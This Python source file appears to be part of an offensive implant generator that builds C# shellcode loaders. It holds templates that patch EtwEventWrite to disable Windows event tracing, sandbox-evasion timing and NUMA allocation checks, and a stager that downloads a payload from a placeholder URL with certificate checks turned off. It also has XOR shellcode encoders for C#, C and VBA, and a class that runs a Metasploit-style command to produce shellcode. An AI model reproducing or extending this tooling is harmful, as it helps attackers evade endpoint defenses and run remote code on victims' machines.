import base64
import subprocess

DLL_IMPORT = {
  "VirtualAlloc": "",
  "CreateThread": "",
  "WaitForSingleObject": "",
  "NtCreateSection":"",
  "NtMapViewOfSection":"",

}
ETW_FUNCS = """
private static byte[] getETWPayload()
    {
        if (!is64Bit())
            return Convert.FromBase64String("whQA");
        return Convert.FromBase64String("ww==");
    }
private static void PatchEtw(byte[] patch)
    {
        try
        {
            uint oldProtect;

            var ntdll = LoadLibrary("ntdll.dll");
            var etwEventSend =   GetProcAddress(ntdll, "EtwEventWrite");

            VirtualProtect(etwEventSend, (UIntPtr)patch.Length, 0x40, out oldProtect);
            Marshal.Copy(patch, 0, etwEventSend, patch.Length);
        }
        catch
        {
            Console.WriteLine("Error unhooking ETW");
        }
    }
"""

ARCH_DETECTION = """
        private static bool is64Bit()
        {
            if (IntPtr.Size == 4)
                return false;

            return true;
        }
"""

HEURISTICS_IMPORT = """
    [DllImport("kernel32.dll")]
    static extern void Sleep(uint dwMilliseconds);
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();

"""

HEURISTICS_CODE = """
    DateTime t1 = DateTime.Now;
    Sleep(2000);
    double t2 = DateTime.Now.Subtract(t1).TotalSeconds; if(t2 < 1.5)
    { return; }

    IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
    if (mem == null)
    { return; }
"""

URL_DL_CODE = """
	string url = "{STAGER_URL}";

       if (!is64Bit())
	    url = "{STAGER_URL}32";

	ServicePointManager.ServerCertificateValidationCallback += (sender, certificate, chain, sslPolicyErrors) => true;
	System.Net.WebClient client = new System.Net.WebClient();
	byte[] buf = client.DownloadData(url);

"""

SC_XOR_DECODER = """
  byte[] buf = new byte[] {{ {xor_shellcode} }};
  for (int i = 0; i < buf.Length; i++)
  {{
    buf[i] = (byte)(((uint)buf[i] ^ {xor_key}) & 0xFF);
  }}
"""

ETW_PATCH = "PatchEtw(getETWPayload());"

class Obfuscator:
  def __init__(self, string, xor_key=b'\00'):
    self.raw = string
    self.key = xor_key
    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_bytes(self):
    return bytes(self.encoded)

  def get_b64(self):
    return base64.b64encode(bytes(self.encoded))

  def get_hex_c(self):
    return ",".join("\\x%02x" % b for b in self.encoded)

  def get_hex_csharp(self):
    return ",".join("0x%02x" % b for b in self.encoded)

  def get_hex_vba(self):
    return ",".join("%02d" % b for b in self.encoded)

  def get_key_csharp(self):
    return "".join("0x%02x" % b for b in self.key)


class ShellCode(Obfuscator):
  def __init__(self, msf_cmd, xor_key=b'\00', caesar_key=0):
    self.raw = subprocess.check_output(msf_cmd, shell=True)
    self.key = xor_key
    self.encoded = [ a ^ b for (a,b) in zip(self.raw, self.key*len(self.raw)) ]

class Implant:
  def __init__(self, template, base_name):
    self.template = template
    self.base_name = base_name


  def compile(self):
    pass
